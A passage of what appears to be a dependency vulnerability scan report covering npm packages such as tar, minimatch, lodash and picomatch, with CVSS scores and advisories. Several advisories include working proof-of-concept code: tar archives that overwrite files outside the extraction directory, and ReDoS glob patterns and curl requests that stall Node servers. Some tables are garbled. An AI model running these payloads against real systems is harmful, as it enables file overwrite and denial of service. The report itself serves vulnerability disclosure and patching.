curl "http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa" &
```

Terminal 3 -- while the attack is in-flight, send a benign request:

```
curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3000/match?pattern=**%2Fy%2Fz&path=x%2Fy%2Fz"
```

**Observed output (Terminal 3):**

```
{"result":true,"ms":"0"}

time_total: 4.132709s
```

The server reports `"ms":"0"` -- the legitimate request itself takes zero processing time. The 4+ second `time_total` is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:

```
{"result":true,"ms":"0"}

time_total: 0.001599s
```

---

### Impact

Any application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.

**tar** `7.5.9` (npm)

`pkg:npm/tar@7.5.9`

*Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')*


|                 |                                                                   |
| --------------- | ----------------------------------------------------------------- |
| Affected range  | `<=7.5.10`                                                        |
| Fixed version   | `7.5.11`                                                          |
| CVSS Score      | `8.2`                                                             |
| CVSS Vector     | `CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:H/SA:N` |
| EPSS Score      | `0.007%`                                                          |
| EPSS Percentile | `0th percentile`                                                  |


Description



### Summary

`tar` (npm) can be tricked into creating a symlink that points outside the extraction directory by using a drive-relative symlink target such as `C:../../../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.

### Details

The extraction logic in `Unpack[STRIPABSOLUTEPATH]` validates `..` segments against a resolved path that still uses the original drive-relative value, and only afterwards rewrites the stored `linkpath` to the stripped value.

What happens with `linkpath: "C:../../../target.txt"`:

1. `stripAbsolutePath()` removes `C:` and rewrites the value to `../../../target.txt`.
2. The escape check resolves using the original pre-stripped value, so it is treated as in-bounds and accepted.
3. Symlink creation uses the rewritten value (`../../../target.txt`) from nested path `a/b/l`.
4. Writing through the extracted symlink overwrites the outside file (`../target.txt`).

This is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.

### PoC

Tested on Arch Linux with `tar@<!-- -->7.5.10`.

PoC script (`poc.cjs`):

```js
const fs = require('fs');
const path = require('path');
const { Header, x } = require('tar');

const cwd = process.cwd();
const target = path.resolve(cwd, '..', 'target.txt');
const tarFile = path.join(cwd, 'poc.tar');

fs.writeFileSync(target, 'ORIGINAL\n');

const b = Buffer.alloc(1536);
new Header({
  path: 'a/b/l',
  type: 'SymbolicLink',
  linkpath: 'C:../../../target.txt',
}).encode(b, 0);
fs.writeFileSync(tarFile, b);

x({ cwd, file: tarFile }).then(() => {
  fs.writeFileSync(path.join(cwd, 'a/b/l'), 'PWNED\n');
  process.stdout.write(fs.readFileSync(target, 'utf8'));
});
```

Run:

```bash
node poc.cjs && readlink a/b/l && ls -l a/b/l ../target.txt
```

Observed output:

```text
PWNED
../../../target.txt
lrwxrwxrwx - joshuavr  7 Mar 18:37 󰡯 a/b/l -> ../../../target.txt
.rw-r--r-- 6 joshuavr  7 Mar 18:37  ../target.txt
```

`PWNED` confirms outside file content overwrite. `readlink` and `ls -l` confirm the extracted symlink points outside the extraction directory.

### Impact

This is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.

Realistic scenarios:

- CLI tools unpacking untrusted tarballs into a working directory
- build/update pipelines consuming third-party archives
- services that import user-supplied tar files
  _Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')_


|                 |                                                                   |
| --------------- | ----------------------------------------------------------------- |
| Affected range  | `<=7.5.9`                                                         |
| Fixed version   | `7.5.10`                                                          |
| CVSS Score      | `8.2`                                                             |
| CVSS Vector     | `CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:N/VI:H/VA:L/SC:N/SI:H/SA:L` |
| EPSS Score      | `0.005%`                                                          |
| EPSS Percentile | `0th percentile`                                                  |


Description



### Summary

`tar` (npm) can be tricked into creating a hardlink that points outside the extraction directory by using a drive-relative link target such as `C:../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.

### Details

The extraction logic in `Unpack[STRIPABSOLUTEPATH]` checks for `..` segments *before* stripping absolute roots.

What happens with `linkpath: "C:../target.txt"`:

1. Split on `/` gives `['C:..', 'target.txt']`, so `parts.includes('..')` is false.
2. `stripAbsolutePath()` removes `C:` and rewrites the value to `../target.txt`.
3. Hardlink creation resolves this against extraction `cwd` and escapes one directory up.
4. Writing through the extracted hardlink overwrites the outside file.

This is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.

### PoC

Tested on Arch Linux with `tar@<!-- -->7.5.9`.

PoC script (`poc.cjs`):

```js
const fs = require('fs');
const path = require('path');
const { Header, x } = require('tar');

const cwd = process.cwd();
const target = path.resolve(cwd, '..', 'target.txt');
const tarFile = path.join(process.cwd(), 'poc.tar');

fs.writeFileSync(target, 'ORIGINAL\n');

const b = Buffer.alloc(1536);
new Header({ path: 'l', type: 'Link', linkpath: 'C:../target.txt' }).encode(
  b,
  0,
);
fs.writeFileSync(tarFile, b);

x({ cwd, file: tarFile }).then(() => {
  fs.writeFileSync(path.join(cwd, 'l'), 'PWNED\n');
  process.stdout.write(fs.readFileSync(target, 'utf8'));
});
```

Run:

```bash
cd test-workspace
node poc.cjs && ls -l ../target.txt
```

Observed output:

```text
PWNED
-rw-r--r-- 2 joshuavr joshuavr 6 Mar  4 19:25 ../target.txt
```

`PWNED` confirms outside file content overwrite. Link count `2` confirms the extracted file and `../target.txt` are hardlinked.

### Impact

This is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.

Realistic scenarios:

- CLI tools unpacking untrusted tarballs into a working directory
- build/update pipelines consuming third-party archives
- services that import user-supplied tar files

**minimatch** `10.2.2` (npm)

`pkg:npm/minimatch@10.2.2`

*Inefficient Regular Expression Complexity*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `>=10.0.0` `<10.2.3`                           |
| Fixed version   | `10.2.3`                                       |
| CVSS Score      | `7.5`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| EPSS Score      | `0.018%`                                       |
| EPSS Percentile | `5th percentile`                               |


Description



### Summary

Nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)`_), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `_(_(_(a|b)))`and an 18-byte non-matching input,`minimatch()`stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default`minimatch()`API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects`+()` extglobs equally.

---

### Details

The root cause is in `AST.toRegExpSource()` at `[src/ast.ts#L598](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598)`. For the `*` extglob type, the close token emitted is `)`* or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:

```typescript
: this.type === '*' && bodyDotAllowed ? `)?`
: `)${this.type}`
```

This produces the following regexps:

| Pattern    | Generated regex |
| ---------- | --------------- | ---------------- | ------------ |
| `\*(a      | b)`             | `/^(?:a          | b)\*$/`      |
| `_(_(a     | b))`            | `/^(?:(?:a       | b)_)_$/`     |
| `_(_(\*(a  | b)))`           | `/^(?:(?:(?:a    | b)_)_)\*$/`  |
| `_(_(_(_(a | b))))`          | `/^(?:(?:(?:(?:a | b)_)_)_)_$/` |

These are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`.

The generated regex is stored on `this.set` and evaluated inside `matchOne()` at `[src/index.ts#L1010](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010)` via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.

Measured times via `minimatch()`:

| Pattern    | Input  | Time          |
| ---------- | ------ | ------------- | ---------- |
| `_(_(a     | b))`   | `a` x30 + `z` | ~68,000ms  |
| `_(_(\*(a  | b)))`  | `a` x20 + `z` | ~124,000ms |
| `_(_(_(_(a | b))))` | `a` x25 + `z` | ~116,000ms |
| `\*(a      | a)`    | `a` x25 + `z` | ~2,000ms   |

Depth inflection at fixed input `a` x16 + `z`:

| Depth | Pattern    | Time   |
| ----- | ---------- | ------ | --------- |
| 1     | `\*(a      | b)`    | 0ms       |
| 2     | `_(_(a     | b))`   | 4ms       |
| 3     | `_(_(\*(a  | b)))`  | 270ms     |
| 4     | `_(_(_(_(a | b))))` | 115,000ms |

Going from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.

---

### PoC

Tested on [minimatch@10.2.2](mailto:minimatch@10.2.2), Node.js 20.

**Step 1 -- verify the generated regexps and timing (standalone script)**

Save as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:

```javascript
import { minimatch, Minimatch } from 'minimatch';

function timed(fn) {
  const s = process.hrtime.bigint();
  let result, error;
  try {
    result = fn();
  } catch (e) {
    error = e;
  }
  const ms = Number(process.hrtime.bigint() - s) / 1e6;
  return { ms, result, error };
}

// Verify generated regexps
for (let depth = 1; depth <= 4; depth++) {
  let pat = 'a|b';
  for (let i = 0; i < depth; i++) pat = `*(${pat})`;
  const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString();
  console.log(`depth=${depth} "${pat}" -> ${re}`);
}
// depth=1 "*(a|b)"          -> /^(?:a|b)*$/
// depth=2 "*(*(a|b))"       -> /^(?:(?:a|b)*)*$/
// depth=3 "*(*(*(a|b)))"    -> /^(?:(?:(?:a|b)*)*)*$/
// depth=4 "*(*(*(*(a|b))))" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/

// Safe-length timing (exponential growth confirmation without multi-minute hang)
const cases = [
  ['*(*(*(a|b)))', 15], // ~270ms
  ['*(*(*(a|b)))', 17], // ~800ms
  ['*(*(*(a|b)))', 19], // ~2400ms
  ['*(*(a|b))', 23], // ~260ms
  ['*(a|b)', 101], // <5ms (depth=1 control)
];
for (const [pat, n] of cases) {
  const t = timed(() => minimatch('a'.repeat(n) + 'z', pat));
  console.log(`"${pat}" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`);
}

// Confirm noext disables the vulnerability
const t_noext = timed(() =>
  minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true }),
);
console.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`);

// +() is equally affected
const t_plus = timed(() => minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))'));
console.log(
  `"+(+(+(a|b)))" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`,
);
```

Observed output:

```
depth=1 "*(a|b)"          -> /^(?:a|b)*$/
depth=2 "*(*(a|b))"       -> /^(?:(?:a|b)*)*$/
depth=3 "*(*(*(a|b)))"    -> /^(?:(?:(?:a|b)*)*)*$/
depth=4 "*(*(*(*(a|b))))" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/
"*(*(*(a|b)))" n=15: 269ms result=false
"*(*(*(a|b)))" n=17: 268ms result=false
"*(*(*(a|b)))" n=19: 2408ms result=false
"*(*(a|b))"    n=23: 257ms result=false
"*(a|b)"       n=101: 0ms result=false
noext=true: 0ms (should be ~0ms)
"+(+(+(a|b)))" n=18: 6300ms result=false
```

**Step 2 -- HTTP server (event loop starvation proof)**

Save as `poc4-server.mjs`:

```javascript
import http from 'node:http';
import { URL } from 'node:url';
import { minimatch } from 'minimatch';

const PORT = 3001;
http
  .createServer((req, res) => {
    const url = new URL(req.url, `http://localhost:${PORT}`);
    const pattern = url.searchParams.get('pattern') ?? '';
    const path = url.searchParams.get('path') ?? '';

    const start = process.hrtime.bigint();
    const result = minimatch(path, pattern);
    const ms = Number(process.hrtime.bigint() - start) / 1e6;

    console.log(
      `[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern="${pattern}" path="${path.slice(0, 30)}"`,
    );
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n');
  })
  .listen(PORT, () => console.log(`listening on ${PORT}`));
```

Terminal 1 -- start the server:

```
node poc4-server.mjs
```

Terminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately:

```
curl "http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&path=aaaaaaaaaaaaaaaaaaaz" &
```

Terminal 3 -- send a benign request while the attack is in-flight:

```
curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3001/match?pattern=*%28a%7Cb%29&path=aaaz"
```

**Observed output -- Terminal 2 (attack):**

```
{"result":false,"ms":"64149"}
```

**Observed output -- Terminal 3 (benign, concurrent):**

```
{"result":false,"ms":"0"}

time_total: 63.022047s
```

**Terminal 1 (server log):**

```
[2026-02-20T09:41:17.624Z] pattern="*(*(*(a|b)))" path="aaaaaaaaaaaaaaaaaaaz"
[2026-02-20T09:42:21.775Z] done in 64149ms result=false
[2026-02-20T09:42:21.779Z] pattern="*(a|b)" path="aaaz"
[2026-02-20T09:42:21.779Z] done in 0ms result=false
```

The server reports `"ms":"0"` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.

Note: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.

---

### Impact

Any context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.

Depth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard.

`+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).

**Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.

*Inefficient Algorithmic Complexity*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `>=10.0.0` `<10.2.3`                           |
| Fixed version   | `10.2.3`                                       |
| CVSS Score      | `7.5`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| EPSS Score      | `0.020%`                                       |
| EPSS Percentile | `5th percentile`                               |


Description



### Summary

`matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `*` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.

---

### Details

The vulnerable loop is in `matchOne()` at `[src/index.ts#L960](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960)`:

```typescript
while (fr < fl) {
  ..
  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {
    ..
    return true
  }
  ..
  fr++
}
```

When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each `**` multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).

There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning `false` on a non-matching input.

Measured timing with n=30 path segments:


| k (globstars) | Pattern size | Time   |
| ------------- | ------------ | ------ |
| 7             | 36 bytes     | ~154ms |
| 9             | 46 bytes     | ~1.2s  |
| 11            | 56 bytes     | ~5.4s  |
| 12            | 61 bytes     | ~9.7s  |
| 13            | 66 bytes     | ~15.9s |


---

### PoC

Tested on [minimatch@10.2.2](mailto:minimatch@10.2.2), Node.js 20.

**Step 1 -- inline script**

```javascript
import { minimatch } from 'minimatch';

// k=9 globstars, n=30 path segments
// pattern: 46 bytes, default options
const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b';
const path = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a';

const start = Date.now();
minimatch(path, pattern);
console.log(Date.now() - start + 'ms'); // ~1200ms
```

To scale the effect, increase k:

```javascript
// k=11 -> ~5.4s, k=13 -> ~15.9s
const k = 11;
const pattern = Array.from({ length: k }, () => '**/a').join('/') + '/b';
const path = Array(30).fill('a').join('/');
minimatch(path, pattern);
```

No special options are required. This reproduces with the default `minimatch()` call.

**Step 2 -- HTTP server (event loop starvation proof)**

The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:

```javascript
// poc1-server.mjs
import http from 'node:http';
import { URL } from 'node:url';
import { minimatch } from 'minimatch';

const PORT = 3000;

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://localhost:${PORT}`);
  if (url.pathname !== '/match') {
    res.writeHead(404);
    res.end();
    return;
  }

  const pattern = url.searchParams.get('pattern') ?? '';
  const path = url.searchParams.get('path') ?? '';

  const start = process.hrtime.bigint();
  const result = minimatch(path, pattern);
  const ms = Number(process.hrtime.bigint() - start) / 1e6;

  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n');
});

server.listen(PORT);
```

Terminal 1 -- start the server:

```
node poc1-server.mjs
```

Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:

```
curl "http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa" &
```

Terminal 3 -- while the attack is in-flight, send a benign request:

```
curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3000/match?pattern=**%2Fy%2Fz&path=x%2Fy%2Fz"
```

**Observed output (Terminal 3):**

```
{"result":true,"ms":"0"}

time_total: 4.132709s
```

The server reports `"ms":"0"` -- the legitimate request itself takes zero processing time. The 4+ second `time_total` is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:

```
{"result":true,"ms":"0"}

time_total: 0.001599s
```

---

### Impact

Any application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.

**lodash** `4.17.23` (npm)

`pkg:npm/lodash@4.17.23`

*Improper Control of Generation of Code ('Code Injection')*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `>=4.0.0` `<=4.17.23`                          |
| Fixed version   | `4.18.0`                                       |
| CVSS Score      | `8.1`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| EPSS Score      | `0.089%`                                       |
| EPSS Percentile | `25th percentile`                              |


Description



### Impact

The fix for [CVE-2021-23337](https://github.com/advisories/GHSA-35jh-r3h4-6jhm) added validation for the `variable` option in `_.template` but did not apply the same validation to `options.imports` key names. Both paths flow into the same `Function()` constructor sink.

When an application passes untrusted input as `options.imports` key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.

Additionally, `_.template` uses `assignInWith` to merge imports, which enumerates inherited properties via `for..in`. If `Object.prototype` has been polluted by any other vector, the polluted keys are copied into the imports object and passed to `Function()`.

### Patches

Users should upgrade to version 4.18.0.

The fix applies two changes:

1. Validate `importsKeys` against the existing `reForbiddenIdentifierChars` regex (same check already used for the `variable` option)
2. Replace `assignInWith` with `assignWith` when merging imports, so only own properties are enumerated

### Workarounds

Do not pass untrusted input as key names in `options.imports`. Only use developer-controlled, static key names.

*Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `<=4.17.23`                                    |
| Fixed version   | `4.18.0`                                       |
| CVSS Score      | `6.5`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L` |
| EPSS Score      | `0.071%`                                       |
| EPSS Percentile | `22nd percentile`                              |


Description



### Impact

Lodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. The fix for [CVE-2025-13465](https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as `Object.prototype`, `Number.prototype`, and `String.prototype`.

The issue permits deletion of prototype properties but does not allow overwriting their original behavior.

### Patches

This issue is patched in 4.18.0.

### Workarounds

None. Upgrade to the patched version.

**validator** `13.15.0` (npm)

`pkg:npm/validator@13.15.0`

*Encoding Error*


|                 |                                                                                                                                                                                  |
| --------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Affected range  | `<13.15.22`                                                                                                                                                                      |
| Fixed version   | `13.15.22`                                                                                                                                                                       |
| CVSS Score      | `7.7`                                                                                                                                                                            |
| CVSS Vector     | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| EPSS Score      | `0.096%`                                                                                                                                                                         |
| EPSS Percentile | `27th percentile`                                                                                                                                                                |


Description



Versions of the package validator before 13.15.22 are vulnerable to Incomplete Filtering of One or More Instances of Special Elements in the isLength() function that does not take into account Unicode variation selectors (\uFE0F, \uFE0E) appearing in a sequence which lead to improper string length calculation. This can lead to an application using isLength for input validation accepting strings significantly longer than intended, resulting in issues like data truncation in databases, buffer overflows in other system components, or denial-of-service.

*Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `<13.15.20`                                    |
| Fixed version   | `13.15.20`                                     |
| CVSS Score      | `6.1`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` |
| EPSS Score      | `0.045%`                                       |
| EPSS Percentile | `14th percentile`                              |


Description



A URL validation bypass vulnerability exists in validator.js prior to version 13.15.20. The isURL() function uses '://' as a delimiter to parse protocols, while browsers use ':' as the delimiter. This parsing difference allows attackers to bypass protocol and domain validation by crafting URLs leading to XSS and Open Redirect attacks.

**picomatch** `4.0.3` (npm)

`pkg:npm/picomatch@4.0.3`

*Inefficient Regular Expression Complexity*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `>=4.0.0` `<4.0.4`                             |
| Fixed version   | `4.0.4`                                        |
| CVSS Score      | `7.5`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| EPSS Score      | `0.055%`                                       |
| EPSS Percentile | `17th percentile`                              |


Description



### Impact

`picomatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when processing crafted extglob patterns. Certain patterns using extglob quantifiers such as `+()` and `*()`, especially when combined with overlapping alternatives or nested extglobs, are compiled into regular expressions that can exhibit catastrophic backtracking on non-matching input.

Examples of problematic patterns include `+(a|aa)`, `+(*|?)`, `+(+(a))`, `*(+(a))`, and `+(+(+(a)))`. In local reproduction, these patterns caused multi-second event-loop blocking with relatively short inputs. For example, `+(a|aa)` compiled to `^(?:(?=.)(?:a|aa)+)$` and took about 2 seconds to reject a 41-character non-matching input, while nested patterns such as `+(+(a))` and `*(+(a))` took around 29 seconds to reject a 33-character input on a modern M1 MacBook.

Applications are impacted when they allow untrusted users to supply glob patterns that are passed to `picomatch` for compilation or matching. In those cases, an attacker can cause excessive CPU consumption and block the Node.js event loop, resulting in a denial of service. Applications that only use trusted, developer-controlled glob patterns are much less likely to be exposed in a security-relevant way.

### Patches

This issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.

Users should upgrade to one of these versions or later, depending on their supported release line.

### Workarounds

If upgrading is not immediately possible, avoid passing untrusted glob patterns to `picomatch`.

Possible mitigations include:

- disable extglob support for untrusted patterns by using `noextglob: true`
- reject or sanitize patterns containing nested extglobs or extglob quantifiers such as `+()` and `*()`
- enforce strict allowlists for accepted pattern syntax
- run matching in an isolated worker or separate process with time and resource limits
- apply application-level request throttling and input validation for any endpoint that accepts glob patterns

### Resources

- Picomatch repository: [https://github.com/micromatch/picomatch](https://github.com/micromatch/picomatch)
- `lib/parse.js` and `lib/constants.js` are involved in generating the vulnerable regex forms
- Comparable ReDoS precedent: CVE-2024-4067 (`micromatch`)
- Comparable generated-regex precedent: CVE-2024-45296 (`path-to-regexp`)
  _Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')_


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `>=4.0.0` `<4.0.4`                             |
| Fixed version   | `4.0.4`                                        |
| CVSS Score      | `5.3`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N` |
| EPSS Score      | `0.165%`                                       |
| EPSS Percentile | `38th percentile`                              |


Description



### Impact

picomatch is vulnerable to a **method injection vulnerability (CWE-1321)** affecting the `POSIX_REGEX_SOURCE` object. Because the object inherits from `Object.prototype`, specially crafted POSIX bracket expressions (e.g., `[[:constructor:]]`) can reference inherited method names. These methods are implicitly converted to strings and injected into the generated regular expression.

This leads to **incorrect glob matching behavior (integrity impact)**, where patterns may match unintended filenames. The issue does **not enable remote code execution**, but it can cause security-relevant logic errors in applications that rely on glob matching for filtering, validation, or access control.

All users of affected `picomatch` versions that process untrusted or user-controlled glob patterns are potentially impacted.

### Patches

This issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.

Users should upgrade to one of these versions or later, depending on their supported release line.

### Workarounds

If upgrading is not immediately possible, avoid passing untrusted glob patterns to picomatch.

Possible mitigations include:

- Sanitizing or rejecting untrusted glob patterns, especially those containing POSIX character classes like `[[:...:]]`.
- Avoiding the use of POSIX bracket expressions if user input is involved.
- Manually patching the library by modifying `POSIX_REGEX_SOURCE` to use a null prototype:
  ```js
  const POSIX_REGEX_SOURCE = {
    __proto__: null,
    alnum: 'a-zA-Z0-9',
    alpha: 'a-zA-Z',
    // ... rest unchanged
  };
  ```

### Resources

- fix for similar issue: [https://github.com/micromatch/picomatch/pull/144](https://github.com/micromatch/picomatch/pull/144)
- picomatch repository [https://github.com/micromatch/picomatch](https://github.com/micromatch/picomatch)

**path-to-regexp** `8.3.0` (npm)

`pkg:npm/path-to-regexp@8.3.0`

*Inefficient Regular Expression Complexity*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `>=8.0.0` `<8.4.0`                             |
| Fixed version   | `8.4.0`                                        |
| CVSS Score      | `7.5`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| EPSS Score      | `0.052%`                                       |
| EPSS Percentile | `16th percentile`                              |


Description



### Impact

A bad regular expression is generated any time you have multiple sequential optional groups (curly brace syntax), such as `{a}{b}{c}:z`. The generated regex grows exponentially with the number of groups, causing denial of service.

### Patches

Fixed in version 8.4.0.

### Workarounds

Limit the number of sequential optional groups in route patterns. Avoid passing user-controlled input as route patterns.

*Inefficient Regular Expression Complexity*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `>=8.0.0` `<8.4.0`                             |
| Fixed version   | `8.4.0`                                        |
| CVSS Score      | `5.9`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| EPSS Score      | `0.052%`                                       |
